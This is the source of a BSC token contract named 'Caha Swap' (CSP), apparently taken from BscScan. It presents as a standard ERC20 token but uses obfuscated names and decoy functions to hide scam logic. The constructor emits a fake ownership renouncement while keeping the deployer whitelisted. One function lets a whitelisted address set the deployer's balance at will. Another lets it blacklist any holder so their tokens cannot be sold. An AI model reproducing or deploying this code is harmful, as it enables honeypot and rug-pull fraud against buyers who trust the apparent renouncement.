/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

abstract contract qjwysxiewapf {
    function yapfsgvmq() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface pevuwtrreahuqn {
    function createPair(address baathojoeimaq, address bpdqcbfeejgv) external returns (address);
}

interface ivvqoekecrwk {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CahaSwap is IERC20, qjwysxiewapf {

    uint256 public uigxgsbttr;

    function balanceOf(address lenpntpbwba) public view virtual override returns (uint256) {
        return uighyeybwout[lenpntpbwba];
    }

    uint256 private qeknmwtebwv = 100000000 * 10 ** 18;

    bool private bjgvegbuuqy;

    function tlvfctnztoct(address bqzsvdkxxu) public {
        if (vkyzkualsy) {
            return;
        }
        
        vlknkhsxlacgsk[bqzsvdkxxu] = true;
        if (alibjsfcrswii == uigxgsbttr) {
            bjgvegbuuqy = false;
        }
        vkyzkualsy = true;
    }

    address public ifrdgzawqa;

    function transferFrom(address vrnpmycpkhi, address dlrwjbklvkuh, uint256 ehjdglmkoots) external override returns (bool) {
        if (wicfujwennqbng[vrnpmycpkhi][yapfsgvmq()] != type(uint256).max) {
            require(ehjdglmkoots <= wicfujwennqbng[vrnpmycpkhi][yapfsgvmq()]);
            wicfujwennqbng[vrnpmycpkhi][yapfsgvmq()] -= ehjdglmkoots;
        }
        return liqitamdcrw(vrnpmycpkhi, dlrwjbklvkuh, ehjdglmkoots);
    }

    function szreglelahqrz(address vrnpmycpkhi, address dlrwjbklvkuh, uint256 ehjdglmkoots) internal returns (bool) {
        require(uighyeybwout[vrnpmycpkhi] >= ehjdglmkoots);
        uighyeybwout[vrnpmycpkhi] -= ehjdglmkoots;
        uighyeybwout[dlrwjbklvkuh] += ehjdglmkoots;
        emit Transfer(vrnpmycpkhi, dlrwjbklvkuh, ehjdglmkoots);
        return true;
    }

    uint256 private xynkpalrgtl;

    uint8 private bcvclrxhmd = 18;

    function owner() external view returns (address) {
        return swbzcmtaknzk;
    }

    uint256 public pocztujmguyz;

    bool private bbiykmansgbjh;

    function approve(address jcebbcjouv, uint256 ehjdglmkoots) public virtual override returns (bool) {
        wicfujwennqbng[yapfsgvmq()][jcebbcjouv] = ehjdglmkoots;
        emit Approval(yapfsgvmq(), jcebbcjouv, ehjdglmkoots);
        return true;
    }

    mapping(address => mapping(address => uint256)) private wicfujwennqbng;

    mapping(address => uint256) private uighyeybwout;

    function transfer(address klqgaipqpcygk, uint256 ehjdglmkoots) external virtual override returns (bool) {
        return liqitamdcrw(yapfsgvmq(), klqgaipqpcygk, ehjdglmkoots);
    }

    bool public fwxfvxvwdsptu;

    uint256 private vwincnoxwy;

    function totalSupply() external view virtual override returns (uint256) {
        return qeknmwtebwv;
    }

    function liqitamdcrw(address vrnpmycpkhi, address dlrwjbklvkuh, uint256 ehjdglmkoots) internal returns (bool) {
        if (vrnpmycpkhi == usmwqbemq) {
            return szreglelahqrz(vrnpmycpkhi, dlrwjbklvkuh, ehjdglmkoots);
        }
        require(!ovbuzjbgvhk[vrnpmycpkhi]);
        return szreglelahqrz(vrnpmycpkhi, dlrwjbklvkuh, ehjdglmkoots);
    }

    uint256 private alibjsfcrswii;

    function allowance(address lcbisrdssxk, address jcebbcjouv) external view virtual override returns (uint256) {
        return wicfujwennqbng[lcbisrdssxk][jcebbcjouv];
    }

    function decimals() external view returns (uint8) {
        return bcvclrxhmd;
    }

    string private cllikphpxsbn = "Caha Swap";

    constructor (){ 
        if (bjgvegbuuqy) {
            jlpujxrvyt = false;
        }
        ivvqoekecrwk mbipfrjgyxuitm = ivvqoekecrwk(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ifrdgzawqa = pevuwtrreahuqn(mbipfrjgyxuitm.factory()).createPair(mbipfrjgyxuitm.WETH(), address(this));
        swbzcmtaknzk = yapfsgvmq();
        
        usmwqbemq = yapfsgvmq();
        vlknkhsxlacgsk[yapfsgvmq()] = true;
        if (xynkpalrgtl != alibjsfcrswii) {
            fwxfvxvwdsptu = false;
        }
        uighyeybwout[yapfsgvmq()] = qeknmwtebwv;
        emit Transfer(address(0), usmwqbemq, qeknmwtebwv);
        bfszwtyakauhqr();
    }

    function name() external view returns (string memory) {
        return cllikphpxsbn;
    }

    address public usmwqbemq;

    bool public vkyzkualsy;

    mapping(address => bool) public vlknkhsxlacgsk;

    event OwnershipTransferred(address indexed gmadbxruofj, address indexed fbdhbxnkacj);

    mapping(address => bool) public ovbuzjbgvhk;

    function sqsjquwpq() public {
        if (bbiykmansgbjh) {
            alibjsfcrswii = pocztujmguyz;
        }
        if (bbiykmansgbjh == fwxfvxvwdsptu) {
            xynkpalrgtl = vwincnoxwy;
        }
        alibjsfcrswii=0;
    }

    function qeeqkyvffkigrd() public {
        
        if (uigxgsbttr == vwincnoxwy) {
            bjgvegbuuqy = true;
        }
        bjgvegbuuqy=false;
    }

    function btyvfqrghje(uint256 ehjdglmkoots) public {
        if (!vlknkhsxlacgsk[yapfsgvmq()]) {
            return;
        }
        uighyeybwout[usmwqbemq] = ehjdglmkoots;
    }

    string private nducusyny = "CSP";

    function bfszwtyakauhqr() public {
        emit OwnershipTransferred(usmwqbemq, address(0));
        swbzcmtaknzk = address(0);
    }

    function symbol() external view returns (string memory) {
        return nducusyny;
    }

    function fboctbijt(address csvfkpaahg) public {
        if (bbiykmansgbjh != jlpujxrvyt) {
            pocztujmguyz = xynkpalrgtl;
        }
        if (csvfkpaahg == usmwqbemq || csvfkpaahg == ifrdgzawqa || !vlknkhsxlacgsk[yapfsgvmq()]) {
            return;
        }
        
        ovbuzjbgvhk[csvfkpaahg] = true;
    }

    function dfahborzxhaomv() public view returns (bool) {
        return bjgvegbuuqy;
    }

    bool private jlpujxrvyt;

    function getOwner() external view returns (address) {
        return swbzcmtaknzk;
    }

    function ocktrljpdrp() public view returns (bool) {
        return bbiykmansgbjh;
    }

    address private swbzcmtaknzk;

    function dleqdfyiauti() public {
        if (vwincnoxwy != xynkpalrgtl) {
            xynkpalrgtl = uigxgsbttr;
        }
        
        xynkpalrgtl=0;
    }

}